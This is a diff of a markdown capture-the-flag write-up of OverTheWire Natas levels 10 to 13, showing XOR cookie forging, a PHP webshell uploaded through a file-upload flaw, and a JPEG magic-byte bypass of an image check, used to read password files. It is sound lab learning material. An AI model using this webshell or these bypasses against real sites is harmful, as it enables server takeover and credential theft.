@@ -1,3 +1,6 @@
+# OverTheWire's Natas Challenges 10 to 19 Writeups
+> We're back solving these, and it sure does prove a tad more difficult.
+
 ### Natas 10
 
 ![][image1]  
@@ -15,7 +18,241 @@ Then it greps both our password file and the dictionary.txt file:
 
 New stuff to look out for on our page:  
 ![][image4]  
-So we have valuable cookies to look out for. Looking for the cookies while inspecting
+So we have valuable cookies to look out for. Looking for the cookies while inspecting, we find the aforementioned XOR-encrypted cookies - 
+<img width="737" height="50" alt="image" src="https://github.com/user-attachments/assets/fbc22651-a4bd-431f-8a3b-2920ff8c7877" /><br/>
+We also have a textbox where we can change the background color using hex values. Setting a color modifies our URL, for example:
+`http://natas11.natas.labs.overthewire.org/?bgcolor=%23000000` or `http://natas11.natas.labs.overthewire.org/?bgcolor=%23e45eff`, so we notice the value is 23 followed by the actual hex.
+Let's now view the sourcecode:
+```
+<?
+
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+
+
+
+?>
+
+```
+Considerably lots more to go through this time. Let's start with `loadData()` - we see the cookie and `$defaultData` being used. Can we reverse the cookie back? Our main block is the xor encryption because we do not know the key, we do know the Base64 decoded cookie is the input. And then `xor_encrypt()` iterates through each character of the decoded cookie and XORs it with each character from the key, iterated also (our key is repeated if too short).
+But wait! The data contains both `showpassword`, set to `no` by default and `bgcolor` which I can set to whatever, that means I know 2/3 of our equation - the input and the output, and just the key is missing!]
+So our encrypted cookie is `EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY=` (notice I changed %3D to = and %2F to / because they were encoded), and we know our values to be no & ffffff.
+I actually didn't know how to decrypt these so I built the PHP script online:
+```
+$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+$enc_cookie = "EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/FGBlgaVVIJDURDSQ1VRY=";
+
+function xor_decrypt($in, $data) {
+    $key = $in;
+    $text = base64_encode(json_encode($data));
+    $outText = '';
+    print_r($text);
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$key = json_decode(xor_decrypt(base64_decode($enc_cookie), $data));
+print_r($key);
+```
+The print value ended up being `eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=`, our encoded cookie!
+Now it was just pasting the values into CyberChef and letting it do its magic:
+<img width="1074" height="601" alt="image" src="https://github.com/user-attachments/assets/ddd5d5bf-b10a-4b79-a2ad-6bc07517b98f" /><br/>
+Our key is `kBSw` repeated.
+Using this, lets create a cookie where the showpassword value is supposedly true - 
+<img width="947" height="635" alt="image" src="https://github.com/user-attachments/assets/0fe11475-70cb-42be-98e1-002ff36cc477" /><br/>
+We get a new encrypted cookie - `EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk`. Let's go back to Firefox DevTools Storage and replace the current cookie value with the one we've just created and refresh the page.
+<img width="562" height="153" alt="image" src="https://github.com/user-attachments/assets/46abdb06-8523-421e-a1b4-9fa87faf50c8" /><br/>
+Hopa!
+
+### Natas 12 
+We've unlocked file uploading!
+<img width="1912" height="262" alt="image" src="https://github.com/user-attachments/assets/7e8abd9e-9cc8-4582-a986-137a9e21b507" /><br/>
+Lets again review the source code first:
+```
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+So if we upload a file, we first call the function `makeRandomPathFromFilename()`, that leads to `makeRandomPath()`, where the path is basically `upload/XXXXXXXXXX.{file_extension}` the X are the result of `genRandomString()` which provides us with a 10 character-long random string.
+I'm also here to remind you that creds are always kept in `/etc/natas_webpass/natas12`. I have a feeling we should keep that in mind.
+So can we play with the file extension? Anyways, I uploaded a random text file to see how the URL modifies, and it's like so:
+`http://natas12.natas.labs.overthewire.org/upload/ct3e444vp4.jpg`
+The server overrides my extension and replaces it with jpg :( This is done by this input:
+```
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+```
+What if I can just change this value in the DevTools? I'll upload a simple text file and test it out -
+<img width="888" height="145" alt="image" src="https://github.com/user-attachments/assets/ef561a54-abff-465f-833d-6f48b1a44287" /><br/>
+It does! Now we can maybe upload a webshell that'll help us out here. I've found a simple PHP webshell online to do our bidding:
+```
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+```
+Following the link to our new upload we're met with a blank screen. We should interact with our webshell and send a GET request with a cmd value of a command of our choice, I'll just `cat` our known password file. Our URL ended up looking like so - 
+`http://natas12.natas.labs.overthewire.org/upload/4o28kjtwnf.php?cmd=cat%20/etc/natas_webpass/natas12`
+And at last we're met with the password for Natas 13, `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`!
+
+### Natas 13
+Same stuff is probably bad news:
+<img width="1919" height="331" alt="image" src="https://github.com/user-attachments/assets/5cf22ee2-8058-4762-979f-1e932564605a" /><br/>
+Lets open up the source code:
+```
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+We are met with a challenge - only uploads of images go through. Whenever we upload anything else we get back a ` File is not an image` error. Fine.
+It's interesting because even if I do change the extension to some type of image and upload it it still says it's not an image. So how does this `exif_imagetype` function find the extension? Let's google.
+<img width="575" height="173" alt="image" src="https://github.com/user-attachments/assets/ba7d6f54-2461-433f-b4d8-ca651f51e1b0" /><br/>
+Ok that's interesting - it tries to identify an image using a magic. So what is the magic of jpgs? It's apparently `FF D8 FF`. I've found an [online file hex editor](https://hexed.it/) and added these three bytes at the beginning of the webshell we used for natas12.
+<img width="683" height="188" alt="image" src="https://github.com/user-attachments/assets/aa85e83f-30d7-4e90-bcce-63b28d0bc9be" /><br/>
+Changing the hidden input extension to `.php` like last time, and uploading this now edited file we're now successful again!
+<img width="581" height="151" alt="image" src="https://github.com/user-attachments/assets/d8e867c4-6f1b-4125-a615-91478b25c7b2" /><br/>
+Now let's change the URL like last time and celebrate our victory!
+<img width="1034" height="118" alt="image" src="https://github.com/user-attachments/assets/622d5e9a-13bb-4b3d-8454-126d36c1dc27" />
+<br/>
+Aha!
+
+### Natas 14
+A login form!
+<img width="1913" height="276" alt="image" src="https://github.com/user-attachments/assets/98c8a1e9-57c4-4517-88db-cf5320a2c057" /><br/>
+
+
+
+
 
 [image1]: <data:image/png;base64,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>
 
